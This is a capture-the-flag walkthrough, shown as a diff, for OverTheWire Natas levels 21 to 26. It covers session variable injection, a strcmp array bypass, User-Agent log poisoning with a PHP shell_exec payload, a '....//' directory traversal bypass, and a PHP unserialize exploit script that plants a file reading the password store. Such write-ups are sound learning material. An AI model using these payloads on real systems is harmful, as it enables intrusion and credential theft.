@@ -1,0 +1,184 @@
+
+natas 21
+
+when we log in, we see the message
+Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org
+
+hence I logged into that site. over there, we are given an option to change some values and send to server. however, if we see the php source code of the server, 
+
+foreach($validkeys as $key => $defval) {
+    $val = $defval;
+    if(array_key_exists($key, $_SESSION)) {
+    $val = $_SESSION[$key];
+    } else {
+    $_SESSION[$key] = $val;
+    }
+    $form .= "$key: <input name='$key' value='$val' /><br>";
+}
+
+this code is used to set all the session variables.
+and in the other page see that the session variable admin needs to be set to 1 if we want to log in.
+
+we just need to create an extra parameter admin in the post request being sent to the server. hence, we click the 'update' button so that it submits the form. and as it gets submitted,
+we need to intercept the post request and set the data being sent like
+
+align=center&fontsize=100%25&bgcolor=yellow&submit=Update&admin=1
+
+then we take the session id for that particular session and in the other page, we can reload it and set the session value to the copied one.
+there will be a session variable admin set to 1 hence it gives password to natas 22
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+natas 22
+
+when we log in, we see nothing displayed on the screen except to view the source code
+
+on viewing the php source code, we see that only if there is a session variable admin that is set to 1, we can use 'revelio' as a get request parameter to get the password to next level
+
+there is no way to set get the session variable admin to be set to 1 so, there has to be a way to get around it. in the first request that we send, with revelio parameter in it, we can take the server response of that to get the password to the next level.
+
+hence, just get the server response for the first request using repeater and get the password to natas 23
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+natas 23
+
+we are asked to enter a password when we log in.
+
+on viewing the sourcecode, we see that when strstr([our input],"iloveyou") returns an output as well as [our input] > 10 is true.
+we just need to have some number in the beigining greater than 10 so that the 2nd condition is satified and have iloveyou following it so that the first condition is stisfied
+
+the strstr() function works like
+
+echo strstr("Hello world!","world"); // returns world!
+
+hence we just give a payload like
+20 iloveyou
+and we get the password
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+natas 24
+
+on opening the site, we are given an option to enter the password.
+
+and in the source code we see
+if(!strcmp($_REQUEST["passwd"],"<censored>"))
+
+so which means that our input should match the censored text which we don't know.
+there has to be some vulnerability in the strcmp function that would allow us to get the result we want without actually matching it
+
+on searching on net for this vulnerability, I found that if we input an array, the strcmp would return value of 0
+
+hence the get request payload will be like
+
+?passwd[]=randomtext
+
+and we get the password to next level
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+natas 25
+
+
+in this level, we see a long text in the index page. our only input is to be able to change the language. now it's possible that when we choose a different language, a different file is getting opened. let's see what's in the php page source
+
+    function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n"; 
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+
+in this function, we can see that we can freely write whatever we want into the log file by manipulating the http user agent request header.
+hence we change it to something like 
+
+<?php $d=shell_exec("cat /etc/natas_webpass/natas26"); echo $d; ?>
+
+so that the password to natas 26 will be written in the log file.
+
+now we need to access the log file.
+
+we can see in the function
+
+function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+        // add more checks...
+
+        if (file_exists($filename)) { 
+            include($filename);
+            return 1;
+        }
+        return 0;
+    }
+
+that when it detects "../" in our get request parameter, it gets deleted. however we can overcome this by simply doing '.....//' instead so that the '../' will only get deleted from the middle of it and it remains as ../
+
+so we traverse to the root directory then to the log file by giving the get request payload like
+
+?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_<your session id>.log
+
+hence the password to the next level will be printed in it.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+natas 26
+
+the vulnerability in this level arises from the usage of unserialize() function.
+the unserialize function should only be use with clean input which is not given by the user directly or else it can be a security vulnerability.
+
+serialize() is used to convert the data of an object in php into a text so that the object can be stored or transferred.
+unserialize() is used to convert the text which was serialized back into an object.
+
+$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+$drawing[]=$new_object;
+
+the above 2 lines in the php source.
+
+all we need to do is make an object of logger class, while setting values for variables which we want to set values for.
+
+and in this case, we want to set values for $logFile so that we can access the log file, we'll place the log file in a directory that is easily accessible. and $exitMsg so that we can print the required information into the file.
+
+We make the log file a php file so that we can keep some code in the exit message that will run when we open the log file
+
+hence run the code - 
+
+<?php
+	class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+
+    function __construct(){
+        $this->exitMsg= "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
+        $this->logFile = "/var/www/natas/natas26/img/natas26_mimm32n0j5asala4u4freems8a.php";
+        }
+    }
+    
+    $obj = new Logger("hello");
+    $t =  base64_encode(serialize($obj));
+    echo $t;
+
+?>
+
+to get the text to be put in place of the 'drawing' cookie.
+
+after replacing the output of the above code in the 'drawing' cookie, we just need to go the log file by going to the /img/natas26_mimm32n0j5asala4u4freems8a.php file.
+
+there we get the password to the next level.
+
+
+
+
+
